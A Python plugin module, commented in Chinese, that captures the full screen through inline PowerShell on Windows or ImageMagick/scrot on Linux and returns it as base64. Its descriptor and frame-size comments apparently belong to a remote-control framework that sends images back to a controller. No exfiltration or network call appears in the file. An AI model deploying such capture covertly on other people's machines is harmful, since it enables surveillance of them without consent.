"""
@module: screenshot
@desc: 屏幕截图（Windows: PowerShell System.Drawing；Linux: import/scrot）
"""
import base64
import os
import subprocess

MODULE = {
    "desc": "屏幕截图（返回 base64 JPEG，Windows 用 PowerShell）",
    "params": [],
}


def _windows():
    """PowerShell System.Drawing 截全屏 → 半尺寸 JPEG → base64。

    半尺寸控制回传体积（单帧 max_frame_size 限制内）。
    """
    ps = (
        "Add-Type -AssemblyName System.Windows.Forms,System.Drawing;"
        "$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;"
        "$bmp=New-Object System.Drawing.Bitmap $b.Width,$b.Height;"
        "$g=[System.Drawing.Graphics]::FromImage($bmp);"
        "$g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size);"
        "$nw=[int]($b.Width/2);$nh=[int]($b.Height/2);"
        "$small=New-Object System.Drawing.Bitmap $nw,$nh;"
        "$g2=[System.Drawing.Graphics]::FromImage($small);"
        "$g2.DrawImage($bmp,0,0,$nw,$nh);"
        "$ms=New-Object System.IO.MemoryStream;"
        "$small.Save($ms,[System.Drawing.Imaging.ImageFormat]::Jpeg);"
        "[Convert]::ToBase64String($ms.ToArray())"
    )
    for cmd in (["powershell", "-NoProfile", "-Command", ps],
                ["powershell.exe", "-NoProfile", "-Command", ps]):
        try:
            out = subprocess.check_output(cmd, timeout=25, text=True)
            return out.strip()
        except FileNotFoundError:
            continue
        except Exception as e:
            return f"(error: {e})"
    return "(screenshot: powershell not found)"


def _linux():
    """优先 import（ImageMagick），其次 scrot。"""
    for tool in ("import", "scrot"):
        try:
            if tool == "import":
                # import -window root png:- 输出到 stdout
                raw = subprocess.check_output(
                    ["import", "-window", "root", "png:-"],
                    timeout=20)
            else:
                raw = subprocess.check_output(
                    ["scrot", "-o", "-"], timeout=20)
            return base64.b64encode(raw).decode("ascii")
        except FileNotFoundError:
            continue
        except Exception as e:
            return f"(error: {e})"
    return "(screenshot: no tool found (install imagemagick or scrot))"


def run():
    """截屏并返回 base64。"""
    if os.name == "nt":
        return _windows()
    return _linux()


if __name__ == "__main__":
    print(run())
